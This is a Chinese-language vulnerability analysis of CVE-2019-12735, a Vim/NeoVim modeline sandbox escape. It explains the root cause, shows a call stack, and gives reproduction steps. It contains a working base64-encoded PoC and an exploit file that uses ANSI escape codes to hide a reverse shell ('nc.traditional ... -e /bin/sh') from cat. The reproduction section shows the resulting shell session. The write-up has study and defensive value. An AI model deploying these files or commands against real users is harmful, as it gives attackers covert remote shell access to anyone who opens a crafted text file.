            "text": "cve-2019-12735\n\n\n0.\u4f5c\u8005\n\n\ninvincible1944@gmail.com\n\n\n1.\u80cc\u666f\u4ecb\u7ecd\n\n\n\n\n\u6f0f\u6d1e\u76f8\u5173\u8f6f\u4ef6\n\n\n\n\nVim/NeoVim \n\n\n\n\n\n\nVim/NeoVim \u7b80\u4ecb\n\n\n\n\n\n\nVim\u662f\u4ecevi\u53d1\u5c55\u51fa\u6765\u7684\u4e00\u4e2a\u6587\u672c\u7f16\u8f91\u5668\uff0c\u662fLinux \u5e73\u53f0\u6700\u5e38\u7528\u7684\u7f16\u8f91\u5668\u4e4b\u4e00\u3002\n\n\n\n\n\n\nNeovim \u662fVim\u7684\u4e00\u4e2a\u91cd\u6784\u7248\u672c\uff0c\u81f4\u529b\u4e8e\u6210\u4e3aVim\u7684\u8d85\u96c6\uff08superset\uff09\uff0c\n\n\n\n\n\n\nNeovim\u7684\u7b2c\u4e00\u4e2a\u7248\u672c\u57282015\u5e7412\u6708\u53d1\u884c\uff0c\u5e76\u4e14\u80fd\u591f\u5b8c\u5168\u517c\u5bb9Vim\u7684\u7279\u6027\u3002 \n\n\n\n\n\n\n\u76f8\u6bd4\u4e8eVim\uff0cNeovim\u7684\u4e3b\u8981\u6539\u8fdb\u5728\u4e8e\u5176\u652f\u6301\u5f02\u6b65\u52a0\u8f7d\u63d2\u4ef6\u3002\n\n\n\n\n\n\n\u6f0f\u6d1e\u5371\u5bb3\n\n\n\n\n\n\n\u6253\u5f00\u6076\u610f\u6784\u9020\u7684\u6587\u672c\u6587\u4ef6\uff0c\u53ef\u4ee5\u89e6\u53d1\u547d\u4ee4\u6267\u884c\uff0c\u4f7f\u653b\u51fb\u8005\u83b7\u5f97\u4e0e\u5f53\u524d\u7528\u6237\u540c\u6837\u7684\u6743\u9650\u3002\n\n\n\n\n\u76f8\u5173\u80cc\u666f\u77e5\u8bc6\n\n\n\n\n\u89c1\u9644\u4ef6\uff1acve-2019-12735-01.md\n\n\n2.\u6f0f\u6d1e\u5206\u6790\n\n\n\n\n\u6f0f\u6d1e\u539f\u7406\u7cbe\u51c6\u6982\u62ec\n\n\n\n\nVim \u7684sandbox\u5bf9\u8f93\u5165\u7684\u547d\u4ee4\u5ba1\u67e5\u4e0d\u4e25\u683c\uff0c\u5bfc\u81f4\u53ef\u4ee5\u901a\u8fc7vim\u7684source\u547d\u4ee4\u52a0\u8f7d\u5176\u4ed6Vim\u811a\u672c\u7ed5\u8fc7\u6c99\u7bb1\u6267\u884c\uff0c\u914d\u5408\u4e0amodeline\u7279\u6027\uff0c\u53ef\u4ee5\u5728Vim\u6253\u5f00\u666e\u901a\u6587\u4ef6\u65f6\u5b9e\u73b0OS command injection.\n\n\n\n\n\u6f0f\u6d1e\u6240\u5c5e\u8f6f\u4ef6\u94fe\u63a5\uff0c\u7248\u672c\uff0c\u6a21\u5757\uff0c\u76ee\u5f55\uff0c\u6587\u4ef6\uff0c\u4ee3\u7801\u884c\n\n\n\n\n\u6f0f\u6d1e\u8f6f\u4ef6\u7248\u672c\uff1aVim <= 8.1.1365/ NeoVim  <= 0.3.6\n\n\n\u6f0f\u6d1e\u4ee3\u7801\u4f4d\u7f6e\uff1aVim 81/src/getchar.c -> openscript\n\n\nVim\u5b98\u7f51\n\n\nVim\u6e90\u7801\u5e93\n\n\n\n\n\u6f0f\u6d1e\u6240\u5c5e\u7c7b\u578b\n\n\n\n\nCWE-78 OS Command Injection\n\n\n\n\n\u6f0f\u6d1e\u8865\u4e01\n\n\n\n\nVim patch\n\n\n\n\n\u6f0f\u6d1eCVE\u53f7\n\n\n\n\nCVE-2019-12735\n\n\n3.POC\n\n\na.POC\u539f\u7406\n\n\n\n\n\n\n\u80cc\u666f\u7b80\u4ecb\n\n\n\n\n\n\nVim\u53ef\u4ee5\u901a\u8fc7Vim\u811a\u672c\u7f16\u5199\u63d2\u4ef6\uff0c\u901a\u8fc7source[!]\u547d\u4ee4\u52a0\u8f7d\u548c\u6267\u884c\u811a\u672c\n\n\n\n\nVim\u652f\u6301\u901a\u8fc7Vim command\u6216\u8005Vim\u811a\u672c\u6267\u884cshell\u6307\u4ee4\n\n\nvim\u652f\u6301\u901a\u8fc7\u8868\u8fbe\u5f0f(\u53ef\u4ee5\u7406\u89e3\u4e3a\u77ed\u811a\u672c)\u5bf9\u6587\u672c\u8fdb\u884c\u8bbe\u7f6e(\u6bd4\u5982folding\u4ee3\u7801\u5757\u6298\u53e0\u663e\u793a\u529f\u80fd)\n\n\n\u8868\u8fbe\u5f0f\u652f\u6301Vim\u6307\u4ee4\uff0c\u4f46\u662f\u4f1a\u5728\u81ea\u5df1\u7684sandbox\u6267\u884c\uff0c\u53ea\u8f93\u51fa\u6267\u884c\u7ed3\u679c\n\n\nVim\u8868\u8fbe\u5f0f\u4e2d\u5b58\u5728\u4e00\u4e9b\u81ea\u5e26\u7684\u51fd\u6570execute, assert_fails\u7b49\uff0c\u53ef\u4ee5\u5c06Vim command\u4f5c\u4e3a\u53c2\u6570\u6267\u884c\u3002\n\n\n\u7531\u4e8e\u9650\u5236\u4e0d\u4e25\u683c\uff0c\u5f53\u8868\u8fbe\u5f0f\u901a\u8fc7execute, assert_fails\u8fd9\u7c7b\u51fd\u6570\u6267\u884csource\u547d\u4ee4\u65f6\uff0c\u4f1a\u5728sandbox\u4e2d\u6267\u884c\uff0c\u4f46\u662fsource \u52a0\u8f7d\u7684Vim\u811a\u672c\u5219\u4f1a\u5728\u6b63\u5e38\u8fdb\u7a0b\u73af\u5883\u4e2d\u6267\u884c\n\n\n\n\nVim\u7684modeline\u529f\u80fd\u662f\u7528\u4e8e\u5bf9\u5355\u4e2a\u6587\u4ef6\u8fdb\u884c\u81ea\u52a8\u914d\u7f6e\u7684\uff0c\u5e76\u4e14\u4e5f\u53ef\u4ee5\u8bbe\u7f6e\u5e26\u6709\u8868\u8fbe\u5f0f\u7684\u914d\u7f6e\uff0c\u56e0\u6b64\u53ef\u4ee5\u5229\u7528\u6b64\u7279\u6027\u5728Vim\u6253\u5f00\u7cbe\u5fc3\u6784\u9020\u7684\u6076\u610f\u6587\u672c\u65f6\u5b9e\u73b0OS command injection.\n\n\n\n\n\n\nPoc\u539f\u7406\n\n\n\n\n\n\n\u8981\u7406\u89e3Poc\u7684\u539f\u7406\uff0c\u9700\u8981\u6709\u4e00\u4e9bVim\u76f8\u5173\u7684\u80cc\u666f\u77e5\u8bc6\uff0c\u89c1\u9644\u4ef6: cve-2019-12735-01.md\n\n\n\u4e0b\u9762\ud83d\udc47\u662fPoc\u7684\u6d41\u7a0b\uff1a\n\n\n\n\n\n\nvim \u6253\u5f00poc\u6587\u4ef6\uff0c\u8bc6\u522b\u51fa\u6587\u4ef6\u9996\u90e8\u7684modeline\n\n\n\n\n\n\n\u8df3\u8fc7\u5f00\u5934\u7684text\uff0c\u4ece\"vi:\"\u540e\u9762\u5f00\u59cb\u4f9d\u6b21\u52a0\u8f7d\u914d\u7f6e\u9009\u9879\n\n\n\n\n\n\n\u52a0\u8f7d\u5230fde\u9009\u9879\u65f6\uff0c\u6267\u884c\u8868\u8fbe\u5f0f\u4e2d\u7684assert_fails\u51fd\u6570\uff0c\u8fdb\u800c\u6267\u884csource! %\u6307\u4ee4\n\n\n\n\n\n\nsource! %\n\u5c06\u5f53\u524d\u6587\u4ef6\u4f5c\u4e3aVim\u811a\u672c\u52a0\u8f7d\u5e76\u6267\u884c\n\n\n\n\n\n\nVim\u811a\u672c\u7684\u5185\u5bb9\u5c31\u662fPoc\u6587\u4ef6\uff0c\u4f46\u662f\u8fd9\u6b21\u4e0e\u76f4\u63a5\u6253\u5f00\u4e0d\u540c\uff0c\u662f\u4f5c\u4e3a\u811a\u672c\u52a0\u8f7d\uff0c\u6240\u4ee5\u6587\u4ef6\u5185\u5bb9\u4e0d\u4f1a\u88ab\u8bc6\u522b\u4e3amodeline\uff0c\u800c\u662f\u8bc6\u522b\u4e3aVim\u811a\u672c\uff0c\u5177\u4f53\u542b\u4e49\u662f\u6267\u884cshell\u547d\u4ee4\nuname -a || \"some text\"\n\uff0c\u4ece\u800c\u5b9e\u73b0\u4e86\u547d\u4ee4\u6267\u884c\n\n\n\n\n\n\n\u8c03\u7528\u6808\u4fe1\u606f\n\n\n```shell\n\n\n0  openscript (\n\n\nname=0x88fba8 \"/home/invincible/Desktop/test/vim_test/poc.txt\", \ndirectly=0x0) at getchar.c:1415\n\n\n\n1  0x000000000046e06f in cmd_source (\n\n\nfname=0x88fba8 \"/home/invincible/Desktop/test/vim_test/poc.txt\", \neap=0x7fffffffc5c0) at ex_cmds2.c:3502\n\n\n\n2  0x000000000046dfd8 in ex_source (eap=0x7fffffffc5c0) at ex_cmds2.c:3484\n\n\n...\n\n\n4  0x0000000000470d89 in do_cmdline (cmdline=0x87ea80 \"source! %\",\n\n\n...\n\n\n7  0x00000000004395ec in call_func (\n\n\nfuncname=0x884d40 \"assert_fails(\\\"source! %\\\")\", len=0xc,\n\n\n\n...\n\n\n9  0x00000000004337f8 in eval7 (arg=0x7fffffffd680, rettv=0x7fffffffd6c0,\n\n\n...\n\n\n16 0x000000000043189b in eval0 (arg=0x884d40 \"assert_fails(\\\"source! %\\\")\",\n\n\n17 0x000000000042cc06 in eval_foldexpr (\n\n\narg=0x884d40 \"assert_fails(\\\"source! %\\\")\", cp=0x7fffffffd70c)\n\n\n\n18 0x00000000004a8403 in foldlevelExpr (flp=0x7fffffffd7b0) at fold.c:3032\n\n\n...\n\n\n26 0x000000000040e02f in chk_modeline (lnum=0x1, flags=0x0) at buffer.c:5234\n\n\n27 0x000000000040dba6 in do_modelines (flags=0x0) at buffer.c:5115\n\n\n...\n\n\n30 0x00000000005e8db0 in main (argc=0x2, argv=0x7fffffffde98) at main.c:881\n\n\n...\n\n\n```\n\n\n\n\n\n\nb.POC\u6e90\u7801\n\n\n$ echo \"OiF1bmFtZSAtYXx8IiB2aTpmZW46ZmRtPWV4cHI6ZmRlPWFzc2VydF9mYWlscygic291cmNlXCFcIFwlIik6ZmRsPTA6ZmR0PSIK\" | base64 --decode > poc.txt\n$ cat poc.txt \n:!uname -a||\" vi:fen:fdm=expr:fde=assert_fails(\"source\\!\\ \\%\"):fdl=0:fdt=\"\n$vim poc.txt\n\n\n\n\n\nc.\u590d\u73b0\u6b65\u9aa4\n\n\n\n\n\n\n\u73af\u5883\u642d\u5efa\n\n\n\n\n\n\n\u73af\u5883\u6e05\u5355\n\n\n\n\n\u7cfb\u7edf\u7248\u672c: Ubuntu-16.04.6 LTS (Xenial Xerus)\n\n\nVim\u7248\u672c: VIM - Vi IMproved 7.4 \n\n\nVim package \u7248\u672c:  2:7.4.1689-3ubuntu1\n\n\n\u955c\u50cf\u4e0b\u8f7d\u5730\u5740: https://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/14.04.6/ubuntu-14.04.6-desktop-amd64.iso\n\n\n\n\n\n\n\n\n\u642d\u5efa\u6b65\u9aa4\n\n\n\n\n\u5b89\u88c5\u865a\u62df\u673a\n\n\n\n\n```shell\n  #  \u521b\u5efa\u865a\u62df\u673a\u786c\u76d8\n  $ qemu-img create -f qcow2 ubuntu16.04.6.img 10G\n\n\n# \u5b89\u88c5\u865a\u62df\u673a\n  $ qemu-system-x86_64  -m 2048 -hda ubuntu16.04.6.img -cdrom ./ubuntu-16.04.6-desktop-amd64.iso\n\n\n# \u542f\u52a8\u865a\u62df\u673a\n  $ qemu-system-x86_64 -m 2048  ubuntu16.04.6.img\n\n\n```\n\n\n\n\n\u5b89\u88c5nc.traditional\n\n\n\n\n\u5efa\u7acb\u4f1a\u8bdd\u7684\u65b9\u5f0f\u5f88\u591a\uff0c\u8fd9\u4e00\u6b65\u53ea\u662f\u4e3a\u4e86\u6f14\u793aexp\u9700\u8981\u3002\n\n\nshell\n  sudo apt-get install netcat-traditional\n\n\n\n\n\u5b89\u88c5\u542b\u6f0f\u6d1e\u7248\u672c\u7684Vim\n\n\n\n\nshell\n  $ sudo apt-get install vim-runtime=2:7.4.1689-3ubuntu1\n  $ sudo apt-get install vim-common=2:7.4.1689-3ubuntu1\n  $ sudo apt-get install vim=2:7.4.1689-3ubuntu1\n\n\n\n\n\u68c0\u67e5Vim\u914d\u7f6e\u662f\u5426\u5f00\u542fmodeline\uff0c\u82e5\u6ca1\u6709\u5219\u914d\u7f6eVim\n\n\n\n\n```shell\n  # \u68c0\u67e5modeline\u914d\u7f6e\n  vim\n  :verbose set modeline? set modelines?\n  # \u5982\u679c\u663e\u793anomodeline\u6216\u8005nomodelines\u8868\u793a\u6ca1\u6709\u914d\u7f6e\n\n\n# \u914d\u7f6e\u65b9\u6cd5\uff1a\n  vim ~/.vimrc\n  i\n  set modeline\n  set modelines=5\n  \n\n  :wq\n\n\n```\n\n\n\n\n\n\n\u7b2c\u4e00\u6b65 \u521b\u5efapoc\u6587\u4ef6\n\n\n\n\n\n\n```shell\n  echo \"G1s/OiF1bmFtZSAtYXx8IiB2aTpmZW46ZmRtPWV4cHI6ZmRlPWFzc2VydF9mYWlscygic291cmNlXCFcIFwlIik6ZmRsPTA6ZmR0PSIK\" | base64 --decode > poc.txt\n\n\nbase64\u7f16\u7801\u660e\u6587\uff1a\n  :!uname -a||\" vi:fen:fdm=expr:fde=assert_fails(\"source!\\ \\%\"):fdl=0:fdt=\"\\n\n\n\n```\n\n\n\n\n\u7b2c\u4e8c\u6b65 \u7528vim\u6253\u5f00\u89e6\u53d1\u547d\u4ee4\u6267\u884c\n(uname -a)\n\n\n\n\n```shell\n  $ vim poc.txt \n\n\nLinux ubuntu 4.4.0-112-generic #135-Ubuntu SMP Fri Jan 19 11:48:36 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux\n\n\nPress ENTER or type command to continue\n\n\n```\n\n\n4.EXP\n\n\na.EXP\u539f\u7406\n\n\n\n\n\n\nExp\u662f\u4e00\u6761\u7cbe\u5fc3\u6784\u9020\u7684modeline\uff0c\u4e3b\u8981\u662f\u4e3a\u4e86\u628a\u6076\u610f\u6587\u4ef6\u4f2a\u9020\u6210\u6b63\u5e38\u6587\u672c\uff0c\u6d88\u9664\u75d5\u8ff9\uff1b \n\n\n\n\n\n\n\u53ef\u4ee5\u5206\u4e3a\u4e24\u90e8\u5206\uff0c\u4e00\u90e8\u5206\u7528\u4e8e\u6b3a\u9a97Vim\uff0c\u5b9e\u73b0\u4ee3\u7801\u6267\u884c\uff0c\u9690\u85cf\u6076\u610f\u6587\u672c\u5185\u5bb9\uff1b\n\n\n\n\n\n\n\u53e6\u4e00\u90e8\u5206\u7528\u4e8e\u6b3a\u9a97cat\uff0c\u4f7f\u6587\u672c\u6253\u5f00\u65f6\u770b\u8d77\u6765\u662f\u6b63\u5e38\u6587\u672c\uff1b\n\n\n\n\n\n\n\u4e3b\u8981\u901a\u8fc7ANSI Escape Code\u6765\u5b9e\u73b0\u8fd9\u4e9b\u9690\u85cf\u529f\u80fd\u3002\n\n\n\n\n\n\nVim\u52a0\u8f7dexp\u6587\u4ef6\u540e\u7b49\u540c\u4e8e\u6267\u884c\u4e0b\u9762\u7684\u5e8f\u5217\uff1a\n\n\n\n\n\n\n```shell\n  # modeline\u89e6\u53d1\u6267\u884c\u81ea\u52a8\u914d\u7f6e\n  :set fen\n  :set fdm=expr\n  :set fde=assert_fails('set\\ fde=x\\ |\\ source!\\ \\%')\n  :set fdl=0\n\n\n# fde=assert_fails\u89e6\u53d1\u4e86assert_fails\u51fd\u6570\u8c03\u7528\n  :call assert_fails(\\'set\\ fde=x\\ \\|\\ source\\!\\ \\%\\')\n\n\n# assert_fails\u51fd\u6570\u6267\u884cvim\u547d\u4ee4\n  :set fde=x | source! %\n\n\n# source! % \u52a0\u8f7d\u5f53\u524d\u6587\u4ef6\uff0c\u5e76\u89c6\u4e3aVim Ex mode\u4e0b\u7684\u811a\u672c\u6267\u884c\uff1a\n  \n\n  S\n  Nothing here.\n  \n\n  :silent! w\n  :call system('nohup nc.traditional 127.0.0.1 9999 -e /bin/sh &') \n  :redraw! \n  :file \n  :silent! # \" vim: set fen fdm=expr fde=assert_fails(\\'set\\ fde=x\\ \\|\\ source\\!\\ \\%\\') fdl=0: \\x16\\x1b[1G\\x16\\x1b[KNothing here.\"\\x16\\x1b[D \\n\n\n\n# \u8bfb\u53d6\u5230\u6362\u884c\u7b26\u53f7\u540e\\n\u6267\u884c\u4e0a\u9762\u7b2c\u4e00\u4e2asilent!\u4ee5\u53ca\u540e\u9762\u7684\u547d\u4ee4\n  # \u901a\u8fc7vim\u7684system\u51fd\u6570\u6267\u884c\u4e86\u7cfb\u7edf\u547d\u4ee4,\u5efa\u7acb\u53cd\u5f39shell\n\n\n```\n\n\n\n\n\u9010\u6761\u89e3\u91ca\n\n\n\n\n```shell\n  # exp.txt: \n  \\x1b[?7l\\x1bSNothing here.\\x1b:silent! w | call system(\\'nohup nc.traditional 127.0.0.1 9999 -e /bin/sh &\\') | redraw! | file | silent! # \" vim: set fen fdm=expr fde=assert_fails(\\'set\\ fde=x\\ \\|\\ source\\!\\ \\%\\') fdl=0: \\x16\\x1b[1G\\x16\\x1b[2KNothing here.\"\\x16\\x1b[2D  \\n\n\n\n# \u4e0b\u6587\u62ec\u53f7\u4e2d\u7684c\u8868\u793a\u7528\u4e8e\u6b3a\u9a97cat\uff0cv\u8868\u793aVim\u811a\u672c\u6b63\u5e38\u6307\u4ee4\n\n\n\\x1b[?7l (c)\n  # \u5173\u95ed\u81ea\u52a8\u6362\u884c\n  # \u914d\u5408\\x1b[1G\u548c\\x1b[K\u4f7f\u7528\uff0c\u89c1\u4e0b\u6587\n  # \u5177\u4f53\u5b9a\u4e49\u548c\u6d4b\u8bd5Demo\u89c1\u9644\u4ef6 ANSI escape codes \u90e8\u5206\n\n\n\\x1bS (v)\n  # \nS \u76f8\u5f53\u4e8e\u4f9d\u6b21\u6309\u4e0bESC\u952e\u548cS\u952e\n  # \u8868\u793a\u526a\u5207\u5f53\u524d\u884c\uff0c\u5e76\u4eceNormal mode\u5207\u6362\u5230Insert mode\n  # \u7ecf\u6d4b\u8bd5\uff0c\u8fd9\u91cc\u7684\\x1b\u662f\u53ef\u4ee5\u53bb\u6389\u7684\n  # \u5177\u4f53\u5b9a\u4e49\u548c\u6d4b\u8bd5Demo\u89c1\u9644\u4ef6 ANSI escape codes \u90e8\u5206\n\n\nNothing here. (v)\n  # \u5728Insert mode\u4e0b\u5199\u5165\u5b57\u7b26\u4e32 Nothing here.\n\n\n\\x1b (v)\n  # \u76f8\u5f53\u4e8e\u4f9d\u6b21\u6309\u4e0bESC\u952e\uff0c\u9000\u51faInsert mode \u8fd4\u56deNormal mode\n\n\n:  (v)\n  # \u4eceNormal mode\u8fdb\u5165Command-line mode\n\n\nsilent! w (v)\n  # \u4fdd\u5b58\u5199\u5165\u7684\u5185\u5bb9\uff0c\u5e76\u4e14\u5173\u95ed\u56de\u663e\n  # \u5177\u4f53\u5b9a\u4e49\u548c\u6d4b\u8bd5Demo\u89c1\u9644\u4ef6 Vim\u8868\u8fbe\u5f0f\u548c\u811a\u672c\u90e8\u5206\n\n\n| call system(\\'nohup nc.traditional 127.0.0.1 9999 -e /bin/sh &\\') (v)\n  # \u8c03\u7528system \u51fd\u6570\u6267\u884cShell\u547d\u4ee4\n  # \u5177\u4f53\u5b9a\u4e49\u548c\u6d4b\u8bd5Demo\u89c1\u9644\u4ef6 Vim\u8868\u8fbe\u5f0f\u548c\u811a\u672c\u90e8\u5206\n\n\n| redraw! (v)\n  # \u6e05\u9664\u56de\u663e\u4fe1\u606f\n  # \u5177\u4f53\u5b9a\u4e49\u548c\u6d4b\u8bd5Demo\u89c1\u9644\u4ef6 Vim\u8868\u8fbe\u5f0f\u548c\u811a\u672c\u90e8\u5206\n\n\n| file | silent! [some text] (v)\n  # \u663e\u793a\u5f53\u524d\u6587\u4ef6\u4fe1\u606f\uff0csilent!\u7528\u4e8e\u6e05\u9664\u540e\u9762\u7684\u5b57\u7b26\u4e32\u4ea7\u751f\u7684\u62a5\u9519\u4fe1\u606f\n  # \u6700\u540e\u7684\u6548\u679c\u5c31\u662f\u5c4f\u5e55\u5e95\u90e8\u663e\u793a\u7684\u662ffile\u7684\u6267\u884c\u7ed3\u679c\n\n\nvim: set fen fdm=expr fde=assert_fails(\\'set\\ fde=x\\ \\|\\ source\\!\\ \\%\\') fdl=0: (v)\n  # vim\u52a0\u8f7d\u65f6modeline\u7684\u6b63\u6587\u90e8\u5206\n  # fen foldenable, \u5f00\u542f\u4ee3\u7801\u6298\u53e0folding\u529f\u80fd\n  # fdm foldmethod, \u8bbe\u7f6efolding\u65b9\u6cd5\u4e3aexpr\n  # fde foldexpr, \u8bbe\u7f6efold expression\n  # assert_fails Vim\u7684\u5185\u90e8\u51fd\u6570\uff0c\u53ef\u4ee5\u6267\u884c\u7b2c\u4e00\u4e2a\u53c2\u6570\u6307\u5b9a\u7684vim\u547d\u4ee4\uff0c\u5177\u4f53\u89c1\u9644\u4ef6\n  # \u6b64\u5904\u6267\u884c\u4e86\u4e24\u4e2a\u547d\u4ee4\uff1a\n  # set fde \u628afoldexpr\u8bbe\u7f6e\u4e3ax(\u76f8\u5f53\u4e8e\u8bbe\u7f6e\u4e3a\u65e0\u6548)\n  # source % \u628a\u5f53\u524d\u6587\u4ef6\u89c6\u4e3avim\u811a\u672c\uff0c\u52a0\u8f7d\u5e76\u6267\u884c\n  # fdl foldlevel \u8bbe\u7f6e\u4e3a0\u8868\u793a\u6240\u6709\u6ee1\u8db3\u6761\u4ef6\u7684\u6587\u672c\u5757\u90fd\u6298\u53e0\u663e\u793a(\u4e0eexp\u65e0\u5173)\n\n\n\\x16 (v) \n  # \u8fd9\u4e2a\u5f88\u5173\u952e\uff0c\u7531\u4e8e\u662f\u7528source! %\u6253\u5f00\uff0c\u6240\u4ee5\u6587\u672c\u7684\u5185\u5bb9\u90fd\u4f1a\u8bc6\u522b\u6210\u5728Normal mode\u4e0b\u7684\u8f93\u5165\uff0c\u6bd4\u5982\\x1b\u5c31\u662f\u6309\u4e0b\n, S\u5c31\u4ee3\u8868\u6309\u4e0b\u952e\u76d8(shift+s)\uff0c\u800c\u5f53\u6267\u884c\u5230\u7b2c\u4e8c\u4e2asilent! \u4e4b\u540e\uff0c\u540e\u9762\u7684\u5b57\u7b26\u4e32\u76f4\u5230'\\n'\u6211\u4eec\u5e0c\u671b\u5b83\u4eec\u88ab\u5ffd\u7565\uff0c\u4f46\u662f\u4e3a\u4e86\u6784\u9020cat\u7684\u8f93\u51fa, \u5b57\u7b26\u4e32\u4e2d\u5305\u542b\u4e86\u5f88\u591aescape code\u6bd4\u5982\\x1b[D, \u4f46\u662f\u8fd9\u4e9b\u4e5f\u4f1a\u88ab\u8bc6\u522b\u6210\u952e\u76d8\u7684\u6309\u952e\u64cd\u4f5c\uff0c\u5bfc\u81f4\u6574\u4e2a\u6307\u4ee4\u90fd\u65e0\u6cd5\u6267\u884c \u800c\\x16\u6b63\u662f\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u5b83\u4f1a\u628a\u4e0b\u4e00\u4e2a\u6309\u952e\u89e3\u6790\u6210\u5b57\u7b26\u800c\u4e0d\u4f1a\u8ba9\u5b83\u6267\u884c\u6309\u952e\u529f\u80fd\uff0c\u5177\u4f53\u5206\u6790\u89c1\u9644\u4ef6 ANSI escape codes\u90e8\u5206\u3002\n\n\n\\x1b[1G (c)\n  # cat\u6253\u5f00\u65f6\u5019\uff0c\u5c06\u5149\u6807\u79fb\u52a8\u5230\u5f53\u524d\u884c\u7684\u9996\u90e8\n  # \u914d\u5408\\x1b[K\u548c\\x1b[?7l\uff0c\u89c1\u4e0b\u6587\n  # \u5177\u4f53\u5206\u6790\u548cDemo\u89c1\u9644\u4ef6 ANSI escape codes\u90e8\u5206\u3002\n\n\n\\x16 (v)\n  # \u4f5c\u7528\u540c\u4e0a\n\n\n\\x1b[2K (c)\n  # \u914d\u5408\\x1b[1G\u548c\\x1b[?7l\uff0c\u5220\u9664\u5f53\u524d\u4f4d\u7f6e\u5230\u884c\u9996\u7684\u5185\u5bb9(\u4e0d\u4f1a\u6539\u53d8\u6587\u672c\uff0c\u53ea\u6539\u53d8\u8f93\u51fa\u5185\u5bb9)\n  # \u7ecf\u8fc7\u8fd9\u4e2a\u5904\u7406\uff0ccat\u7684\u67e5\u770b\u7ed3\u679c\u5c31\u53ea\u5269\u4e0b\u540e\u9762\u7684\u4fe1\u606f\u4e86\n  # \u5177\u4f53\u5206\u6790\u548cDemo\u89c1\u9644\u4ef6 ANSI escape codes\u90e8\u5206\u3002\n\n\nNothing here.\" (c)\n  # \u51c6\u5907\u8ba9cat\u67e5\u770b\u6587\u4ef6\u8f93\u51fa\u7684\u5b57\u7b26\u4e32\uff0c\u4e0eVim\u6253\u5f00\u6587\u4ef6\u65f6\u67e5\u770b\u5230\u7684\u5185\u5bb9\u76f8\u540c\n\n\n\\x16 (v)\n  # \u4f5c\u7528\u540c\u4e0a\n\n\n\\x1b[2D (c) \n  # \u5149\u6807\u5411\u524d\u79fb\u52a82\u4f4d\n  # \u5177\u4f53\u5206\u6790\u548cDemo\u89c1\u9644\u4ef6 ANSI escape codes\u90e8\u5206\u3002\n\n\n\\n (c&v)\n\n\n\n# \u56e0\u4e3a\u5149\u6807\u524d\u79fb,\u4e24\u4e2a\u7a7a\u683c\u4f1a\u8986\u76d6Nothing here.\" \u5b57\u7b26\u4e32\u6700\u540e\u7684\u5f15\u53f7\"\u548c\\x16\n  # \u4e8e\u662fcat\u7684\u8f93\u51fa\u53ea\u5269\u4e0b \\x16Nothing here.\\n\n  # \\n\u6362\u884c\u89e6\u53d1 silent! w | ... | file | silent! [some text]  \u6574\u6761\u547d\u4ee4\u7684\u6267\u884c\n  # \u5176\u4e2dcall system\u5b8c\u6210\u7cfb\u7edf\u547d\u4ee4\u6267\u884c\u5efa\u7acb\u53cd\u5f39shell\n\n\n```\n\n\nb.EXP\u6e90\u7801\n\n\n\u539f\u4f5c\u8005exp: \nshell.txt\n\n\n\u4f18\u5316\u8fc7\u7684exp: \n\n\necho \"G1s/N2wbUyBOb3RoaW5nIGhlcmUuGzpzaWxlbnQhIHcgfCBjYWxsIHN5c3RlbSgnbm9odXAgbmMudHJhZGl0aW9uYWwgMTI3LjAuMC4xIDk5OTkgLWUgL2Jpbi9zaCAmJykgfCByZWRyYXchIHwgZmlsZSB8IHNpbGVudCEgIyAiIHZpbTogc2V0IGZlbiBmZG09ZXhwciBmZGU9YXNzZXJ0X2ZhaWxzKCdzZXRcIGZkZT14XCBcfFwgc291cmNlXCFcIFwlJykgZmRsPTA6IBYbWzFHFhtbMktOb3RoaW5nIGhlcmUuIhYbWzJEICAK\" | base64 --decode > exp.txt\n\n# base64\u7f16\u7801\u5bf9\u5e94\u7684\u660e\u6587\n\\x1b[?7l\\x1bS Nothing here.\\x1b:silent! w | call system(\\'nohup nc.traditional 127.0.0.1 9999 -e /bin/sh &\\') | redraw! | file | silent! # \" vim: set fen fdm=expr fde=assert_fails(\\'set\\\\ fde=x\\\\ \\\\|\\\\ source\\\\!\\\\ \\\\%\\') fdl=0: \\x16\\x1b[1G\\x16\\x1b[2KNothing here.\"\\x16\\x1b[2D  \\n\n\n# \u4fee\u6539\u4e86\u56db\u5904\n# \u4fee\u6539\u539f\u56e0\u89c1\u9644\u4ef6\n# nc -> nc.traditional \n# \\x1b[K -> \\x1b[2K \n# \\x1b[D -> \\x1b[2D \n#  \\n  ->   \\n (\u589e\u52a0\u4e86\u4e00\u4e2a\u7a7a\u683c)\n\n\n\n\n\nc.\u590d\u73b0\u6b65\u9aa4\n\n\n\n\n\n\n\u642d\u5efa\u590d\u73b0\u73af\u5883\uff0c\u4e0ePoc\u76f8\u540c\n\n\n\n\n\n\n\u7b2c\u4e00\u6b65\uff0c\u521b\u5efaexp\u6587\u4ef6\n\n\n\n\n\n\n```shell\n  $ echo \"G1s/N2wbUyBOb3RoaW5nIGhlcmUuGzpzaWxlbnQhIHcgfCBjYWxsIHN5c3RlbSgnbm9odXAgbmMudHJhZGl0aW9uYWwgMTI3LjAuMC4xIDk5OTkgLWUgL2Jpbi9zaCAmJykgfCByZWRyYXchIHwgZmlsZSB8IHNpbGVudCEgIyAiIHZpbTogc2V0IGZlbiBmZG09ZXhwciBmZGU9YXNzZXJ0X2ZhaWxzKCdzZXRcIGZkZT14XCBcfFwgc291cmNlXCFcIFwlJykgZmRsPTA6IBYbWzFHFhtbMktOb3RoaW5nIGhlcmUuIhYbWzJEICAK\" | base64 --decode > exp.txt\n\n\n```\n\n\n\n\n\u7b2c\u4e8c\u6b65\uff0c\u76d1\u542cnc\u56de\u8fde\u7aef\u53e3\n\n\n\n\n```shell\n  $ nc -vlp 9999\n  Listening on [0.0.0.0] (family 0, port 9999)\n\n\n```\n\n\n\n\n\u7b2c\u4e09\u6b65\uff0cVim\u6253\u5f00exp\u6587\u4ef6\n\n\n\n\n```shell\n  $ vim exp.txt\n   Nothing here.\n  ~                                                                    \n\n  ...                                                                   \n\n  ~                                                                             \n\n  \"exp.txt\" line 1 of 1 --100%-- col 14\n\n\n```\n\n\n\n\n\u4f1a\u8bdd\u5efa\u7acb\u6210\u529f\n\n\n\n\n```shell\n  $ nc -vlp 9999\n  Listening on [0.0.0.0] (family 0, port 9999)\n  Connection from [127.0.0.1] port 9999 [tcp/*] accepted (family 2, sport 55824)\n  pwd\n  /home/invincible/Desktop/test/vim_test\n  id\n  uid=1000(invincible) gid=1000(invincible) 